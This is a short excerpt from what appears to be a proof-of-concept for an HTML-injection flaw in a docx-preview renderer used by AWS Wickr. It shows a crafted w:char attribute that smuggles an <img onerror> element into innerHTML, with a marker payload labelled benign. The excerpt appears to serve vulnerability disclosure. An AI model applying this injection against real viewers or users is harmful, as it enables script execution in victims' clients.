...
# -> renderSymbol sets innerHTML = "&#x0;<img ...>;" -> injects the <img> element.
# XML-escaped for placement inside the double-quoted w:char attribute:
WCHAR_ATTR = ('0;&lt;img src=x alt=WICKR-HTMLi-POC '
              'onerror=&quot;window.__WICKR_HTMLI_POC__=1&quot;&gt;')
...
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t xml:space="preserve">AWS Wickr docx-preview HTML-injection PoC (benign). The symbol run below injects a marker &lt;img&gt; via w:sym/@w:char.</w:t></w:r></w:p>
